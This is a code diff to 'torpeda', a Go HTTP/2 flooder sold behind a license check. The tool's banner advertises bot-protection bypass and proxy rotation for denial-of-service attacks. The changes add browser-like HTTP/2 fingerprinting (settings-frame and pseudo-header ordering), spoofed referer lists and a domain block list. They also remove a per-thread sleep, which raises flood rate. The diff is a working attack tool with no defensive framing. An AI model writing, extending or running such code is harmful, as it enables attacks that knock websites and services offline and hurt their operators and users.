@@ -23,6 +23,22 @@ import (
 	"h12.io/socks"
 )
 
+var (
+	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
+	settingsFrame = map[http2.SettingID]uint32{
+		http2.SettingHeaderTableSize:   65536,
+		http2.SettingEnablePush:        0,
+		http2.SettingInitialWindowSize: 6291456,
+		http2.SettingMaxHeaderListSize: 262144,
+	}
+	settingsFrameOrder = []http2.SettingID{
+		http2.SettingHeaderTableSize,
+		http2.SettingEnablePush,
+		http2.SettingInitialWindowSize,
+		http2.SettingMaxHeaderListSize,
+	}
+)
+
 var supportedVersions = []uint16{
 	0xfafa,           
 	tls.VersionTLS13, 
@@ -56,70 +72,57 @@ var supportedGroups = []tls.CurveID{
 }
 
 var (
-	reqmethod     string
-	target        string
-	duration      int
-	threads       int
-	rps           float64
-	proxies       = []string{}
-	proxyFile     string
-	debug         bool
-	extra         bool
-	test          bool
-	redirect      bool
-	parsed        bool
-	cf            bool
-	usehttp1      bool
-	cookies       = ""
-	timeoutCount int
-	refererURL string
-	customCookie  string
-	customUserAgent string
-	connectionFlow = uint32(15663105)
-	statusMap      = make(map[int]int)
-	statusMutex    sync.Mutex
-	customHeaders  = make(map[string]string)
-	licenseVerified = false
+	reqmethod        string
+	target           string
+	duration         int
+	threads          int
+	rps              float64
+	proxies          = []string{}
+	proxyFile        string
+
+	debug            bool
+	extra            bool
+	test             bool
+	redirect         bool
+	parsed           bool
+	cf               bool
+	usehttp1         bool
+
+	cookies          = ""
+	timeoutCount     int
+	refererURL       string
+	customCookie     string
+	customUserAgent  string
+
+	connectionFlow   = uint32(15663105)
+	statusMutex      sync.Mutex
+	statusMap        = make(map[int]int)
+	customHeaders    = make(map[string]string)
+	licenseVerified  = false
+
+	blockedDomains = []string{".gov", ".by", ".ua"}
+
+	randomReferers = []string{
+		"https://www.google.com",
+		"https://bing.com",
+		"https://yahoo.com",
+		"https://duckduckgo.com",
+		"https://youtube.com",
+		"https://vk.com",
+		"https://x.com",
+		"https://github.com",
+		"https://dzen.ru",
+		"https://instagram.com",
+		"https://tiktok.com",
+		"https://wikipedia.org",
+		"https://chatgpt.com",
+		"https://reddit.com",
+		"https://amazon.com",
+	}
 )
 
 const licenseURL = "https://raw.githubusercontent.com/Pxttern/license-for-torpeda/main/license"
 const requiredLicense = "1337" 
-
-var blockedDomains = []string{".gov", ".by", ".ua"}
-
-var randomReferers = []string{
-	"https://google.com",
-	"https://bing.com",
-	"https://yahoo.com",
-	"https://duckduckgo.com",
-	"https://youtube.com",
-	"https://vk.com",
-	"https://x.com",
-	"https://github.com",
-	"https://dzen.ru",
-	"https://instagram.com",
-	"https://tiktok.com",
-	"https://wikipedia.org",
-	"https://chatgpt.com",
-	"https://reddit.com",
-	"https://amazon.com",
-}
-
-var (
-	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
-	settingsFrame = map[http2.SettingID]uint32{
-		http2.SettingHeaderTableSize:   65536,
-		http2.SettingEnablePush:        0,
-		http2.SettingInitialWindowSize: 6291456,
-		http2.SettingMaxHeaderListSize: 262144,
-	}
-	settingsFrameOrder = []http2.SettingID{
-		http2.SettingHeaderTableSize,
-		http2.SettingEnablePush,
-		http2.SettingInitialWindowSize,
-		http2.SettingMaxHeaderListSize,
-	}
-)
 
 func checkLicense() {
 	if licenseVerified {
@@ -172,22 +175,13 @@ func isBlockedDomain(target string) bool {
     return false
 }
 
-func updateErrorCounters(err error) {
-    statusMutex.Lock()
-    defer statusMutex.Unlock()
-
-    if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-        timeoutCount++
-    }
-}
-
 func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 	fmt.Print("\033[H\033[2J")
-	fmt.Println(`	[flooder - golang] torpeda v0.4 // Updated: 10.11.2024 // Made with love :D
+	fmt.Println(`	[flooder - golang] torpeda v0.5 // Updated: 11.11.2024 // Made with love :D
 	Developers to method: mitigations aka @rapidreset
-	Annoucement: @torpeda && github.com/pxttr
+	Annoucement: @torpeda && github.com/pxttrn
 	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
 	How to use & example:
 
@@ -667,7 +661,6 @@ func start(proxy string) {
 
 		transport.MaxIdleConns = 0
 		transport.MaxIdleConnsPerHost = 0
-		
 		transport_http2.Settings = settingsFrame
 		transport_http2.SettingsOrder = settingsFrameOrder
 		transport_http2.PseudoHeaderOrder = pseudoHeaderOrder
@@ -735,13 +728,21 @@ func start(proxy string) {
 					updateErrorCounters(err)
                     continue
                 }
+				resp.Body.Close()
                 updateStatusMap(resp.StatusCode)
-                resp.Body.Close()
             }
         }()
-        time.Sleep(time.Second)
     }
     wg.Wait()
+}
+
+func updateErrorCounters(err error) {
+    statusMutex.Lock()
+    defer statusMutex.Unlock()
+
+    if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+        timeoutCount++
+    }
 }
 
 func updateStatusMap(statusCode int) {
@@ -786,7 +787,7 @@ fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠�
         fmt.Println("> Threads:", threads)
         fmt.Println("> Ratelimit:", rps)
 
-        currentTime := time.Now()
+		currentTime := time.Now()
         elapsedTime := currentTime.Sub(startTime).Seconds()
         averageRPS := float64(totalRequests) / elapsedTime
         remainingTime := float64(duration) - elapsedTime
@@ -805,11 +806,9 @@ fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠�
         for _, code := range codes {
             statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
         }
-
         statusString += fmt.Sprintf(" [H2_CLOSE: %d]", timeoutCount)
 
         fmt.Printf("%s\n", statusString)
-
         fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
         fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)
 
@@ -818,6 +817,7 @@ fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠�
         }
 
         statusMap = make(map[int]int)
+        timeoutCount = 0
         statusMutex.Unlock()
     }
 }
